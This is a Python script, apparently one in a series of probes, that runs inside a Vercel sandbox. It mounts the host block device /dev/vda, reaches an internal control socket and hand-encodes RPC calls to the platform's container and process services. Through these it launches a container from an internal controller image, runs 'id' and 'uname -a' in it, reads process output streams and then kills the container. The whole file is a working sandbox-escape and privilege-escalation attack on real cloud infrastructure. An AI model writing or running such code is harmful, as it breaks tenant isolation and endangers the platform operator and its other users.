# -*- coding: utf-8 -*-
"""vda18_stream_fields: StreamOutput stdout/stderr 字段确认 + Create 长超时 + Exec proto
P1: Create(30s 超时) -> Start
P2: Process StreamOutput connect+proto 带 stdout/stderr bool (字段 2/3)
P3: Exec connect+proto (container_id=1, command=2) 在存活容器
P4: 容器 StreamOutput connect+proto
输出落盘 + 哨兵 V18E_DONE"""
import os, time, socket, ctypes, re, struct

OUT = '/vercel/sandbox/v18e.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_raw(sockpath, path, body, ctype, t=6, shutdown_wr=True):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        if isinstance(body, str):
            body = body.encode()
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        if shutdown_wr:
            try:
                s.shutdown(socket.SHUT_WR)
            except Exception:
                pass
        data = b''
        while True:
            try:
                chunk = s.recv(16384)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:1000].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def env_proto(payload):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    b = s.encode()
    tag = (field_no << 3) | 2
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    l = len(b)
    while l > 127:
        out.append((l & 127) | 128)
        l >>= 7
    out.append(l)
    return bytes(out) + b


def pbool(field_no, v):
    tag = (field_no << 3) | 0
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    out.append(1 if v else 0)
    return bytes(out)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sp = '/mnt/vdax/run/cell/cell.sock'
    IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
    CSVC = '/vercel.hive.cell.api.containers.v1.ContainersService'
    PSVC = '/vercel.hive.cell.api.processes.v1.ProcessService'

    # P1: Create (长超时) + Start
    log('=== P1 Create+Start ===')
    cid = None
    for attempt in range(3):
        st, bd = rpc_raw(sp, CSVC + '/Create', '{"image":"%s","command":"/bin/sleep 300"}' % IMG,
                         'application/json', t=45)
        log('create#%d -> %s | %s' % (attempt, st, bd[:250]))
        m = re.search(r'"containerId":\s*"([^"]+)"', bd)
        if m:
            cid = m.group(1)
            log('CID=%s' % cid)
            break
        if '499' in st or 'NORESP' in st:
            time.sleep(3)
            continue
        break
    if cid:
        st, bd = rpc_raw(sp, CSVC + '/Start', '{"container_id":"%s"}' % cid, 'application/json', t=10)
        log('start -> %s | %s' % (st, bd[:200]))

    # P2: Process StreamOutput stdout/stderr 字段
    log('=== P2 Process StreamOutput fields ===')
    pid27 = 'hvcp_' + 'a' * 27
    for flds, tag in [(pstr(1, pid27) + pbool(2, True), 'stdout'),
                      (pstr(1, pid27) + pbool(3, True), 'stderr'),
                      (pstr(1, pid27) + pbool(2, True) + pbool(3, True), 'both')]:
        st, bd = rpc_raw(sp, PSVC + '/StreamOutput', env_proto(flds), 'application/connect+proto', t=5)
        log('proc stream %s -> %s | %s' % (tag, st, bd[:250].replace('\n', ' ')))
        time.sleep(0.4)

    # P3: Exec connect+proto
    log('=== P3 Exec proto ===')
    if cid:
        for cmd in ['id', '/bin/sh -c id;uname -a']:
            payload = pstr(1, cid) + pstr(2, cmd)
            st, bd = rpc_raw(sp, CSVC + '/Exec', env_proto(payload), 'application/connect+proto', t=10)
            log('exec %-30s -> %s | %s' % (cmd, st, bd[:400].replace('\n', ' ')))
            time.sleep(0.5)

    # P4: 容器 StreamOutput
    log('=== P4 Container StreamOutput ===')
    if cid:
        for flds, tag in [(pstr(1, cid), 'noflag'), (pstr(1, cid) + pbool(2, True), 'stdout')]:
            st, bd = rpc_raw(sp, CSVC + '/StreamOutput', env_proto(flds), 'application/connect+proto', t=6)
            log('ctr stream %s -> %s | %s' % (tag, st, bd[:300].replace('\n', ' ')))
            time.sleep(0.5)

    # P5: Kill
    if cid:
        st, bd = rpc_raw(sp, CSVC + '/Kill', '{"container_id":"%s"}' % cid, 'application/json', t=5)
        log('kill -> %s | %s' % (st, bd[:150]))

    log('V18E_DONE')
    f.close()


if __name__ == '__main__':
    main()
